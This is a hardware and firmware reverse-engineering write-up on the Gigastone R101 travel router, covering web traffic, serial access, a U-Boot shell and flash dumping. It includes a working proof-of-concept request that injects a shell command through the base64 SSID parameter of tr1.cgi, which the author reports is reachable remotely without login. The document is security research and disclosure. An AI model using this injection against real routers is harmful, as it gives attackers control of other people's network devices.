# RE of Gigastone R101 Mini Wireless Router / Wireless Travel Router

The R101 is a cheap wireless router sold by Gigastone.
Gigastone is a electronics brand based in Taiwan.

[Amazon link1.](https://www.amazon.com/Gigastone-GS-TR1-R-Wireless-Travel-Router/dp/B01DR04V90)
[Amazon link2.](https://www.amazon.com/Gigastone-TR1-Wireless-Extension-Processor/dp/B0BVTYYDQH/)

![41-czovIRFL _AC_SX522_](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/36e0f064-4b5e-4bf8-bdb5-3b70db17efa8)

# Web interface

After logging in with the default credentials, I watched network traffic from dev tools while setting the SSID.
It seems the device uses `tr1.cgi?cgi=2` for configuration.
The device uses base64 to send the SSID.

![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/4b1597ec-1484-4e59-98e0-f050da488c68)

This field has command injection, and we can use the new SSID as the commands output.

SSID is set to base64 of string `` `echo command injection` `` (`YGVjaG8gY29tbWFuZCBpbmplY3Rpb25gCg==`)
```
http://<ROUTER_IP>/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YGVjaG8gY29tbWFuZCBpbmplY3Rpb25gCg==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=
```

This API seems to be hittable from a remote IP, when not logged in (even with default password changed).

![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/4346f60e-8f03-4636-a46f-ae87b2d0490c)

![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/b886fa58-2fd6-488c-8a4e-b212a7ff1b4d)

# Hardware/Serial

We can find Gigastones filing for R101 in the [FCC ID](https://fccid.io/PLE-TRR1011) database

Looking at internal photos from FCCID, it looks like there's a serial port in the corner opposite the power button.

![image](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/433ee296-e97e-460f-9b0a-e1deccdd58d3)

Soldering to the board and watching for serial confirms this.
I used a "USB to TTL" adapter to get serial from USB, and Putty to act as my terminal.
Using a multimeter in continuity mode showed the leftmost pin was ground.

Watching boot with baud set to 115200
```
U-Boot 1.1.4-ga519b4f0-dirtyOct  9 201317:21:10

AP121 (ar9331) U-boot

DRAM:  16 MB
Flash Manuf Id 0x0, DeviceId0 0x0, DeviceId1 0x0
flash size 4194304, sector count = 64
Flash:  4 MB
Using default environment

In:    serial
Out:   serial
Err:   serial
Net:   ag7240_enet_initialize...
No valid address in Flash. Using fixed address
No valid address in Flash. Using fixed address
: cfg1 0x5 cfg2 0x7114
eth0: 00:03:7f:09:0b:ad
eth0 up
: cfg1 0xf cfg2 0x7214
eth1: 00:03:7f:09:0b:ad
athrs26_reg_init_lan
ATHRS26: resetting s26
ATHRS26: s26 reset done
eth1 up
eth0, eth1
Hit any key to stop autoboot:  0
## Booting image at 9f300000 ...
   Image Name:   Linux Kernel Image
   Created:      2014-02-26   4:14:51 UTC
   Image Type:   MIPS Linux Kernel Image (lzma compressed)
   Data Size:    905965 Bytes = 884.7 kB
   Load Address: 80002000
   Entry Point:  801ea0e0
   Verifying Checksum at 0x9f300040 ...OK
   Uncompressing Kernel Image ... OK

Starting kernel ▒ɩ
                  ▒▒▒▒▒Zk▒*▒3▒  ▒▒▒YW▒▒
```

Watching boot with baud set to 128000
```
`@@▒▒▒▒▒▒▒▒▒`▒▒▒▒▒▒▒▒`▒▒`p▒y▒s`ppdp@^nN▒▒
`@@▒▒▒▒▒▒▒▒▒▒▒▒▒`▒▒▒▒▒▒@▒▒▒▒▒@^nN@▒▒
▒▒▒▒▒▒▒▒@▒▒▒▒▒▒ ...

Booting AR9330(Hornet)...
```

Hitting a key during boot brings us to a UBOOT shell
```
TR1> help
reset   - Perform RESET of the CPU
?       - alias for 'help'
boot    - boot default, i.e., run 'bootcmd'
bootd   - boot default, i.e., run 'bootcmd'
bootm   - boot application image from memory
cp      - memory copy
dhcp    - invoke DHCP client to obtain IP/boot params
erase   - erase FLASH memory
help    - print online help
httpd   - start webserver
md      - memory display
mm      - memory modify (auto-incrementing)
mtest   - simple RAM test
mw      - memory write (fill)
nm      - memory modify (constant address)
ping    - send ICMP ECHO_REQUEST to network host
printenv- print environment variables
progmac - Set ethernet MAC addresses
reset   - Perform RESET of the CPU
run     - run commands in an environment variable
setenv  - set environment variables
tftpboot- boot image via network using TFTP protocol
version - print monitor version
TR1>
TR1> printenv
bootargs=console=ttyS0,115200 root=31:02 rootfstype=squashfs init=/sbin/init mtdparts=ar7240-nor0:256k(u-boot),64k(u-boot-env),2752k(rootfs),896k(uImage),64k(NVRAM),64k(ART)
bootcmd=bootm 0x9f300000
bootdelay=1
baudrate=115200
ethaddr=0x00:0xaa:0xbb:0xcc:0xdd:0xee
ipaddr=192.168.16.254
serverip=192.168.16.10
stdin=serial
stdout=serial
stderr=serial
ethact=eth0
nc=setenv stdin nc;setenv stdout nc;setenv stderr serial
serial=setenv stdin serial;setenv stdout serial;setenv stderr serial
ncip=192.168.16.10
```

From here we can dump memory with `md`, and convert it into raw binary. I personally like to use python, with a quick script like below.
```
#!/bin/python3

import sys

if len(sys.argv) != 2:
    print("GIVE ME FILE NOW")
    sys.exit(1)

with open(sys.argv[1]) as open_file:
    with open("output.bin", "wb") as out_file:
        for line in open_file:
            line = line.strip()

            tokens = line.split(" ")
            byte_str = ''.join(tokens[1:6])
            print(byte_str)

            print(tokens)
            byte_o = bytes.fromhex(byte_str)
            out_file.write(byte_o)
```

From memory address `0x9f300000` to `0x9f3dd320` there seems to be a Linux Kernel Image.
```
output.bin: u-boot legacy uImage, Linux Kernel Image, Linux/MIPS, OS Kernel Image (lzma), 905965 bytes, Wed Feb 26 04:14:51 2014, Load Address: 0x80002000, Entry Point: 0x801EA0E0, Header CRC: 0x0F2D2E50, Data CRC: 0x85246A37
```

On first attempt, trying to get a linux shell from by setting the bootargs doesn't seem to work
```
setenv bootargs "console=115200 root=31:02 rootfstype=squashfs init=/bin/busybox mtdparts=ar7240-nor0:256k(u-boot),64k(u-boot-env),2752k(rootfs),896k(uImage),64k(NVRAM),64k(ART)"
setenv nc "setenv stdin serial;setenv stdout serial;setenv stderr serial"
```
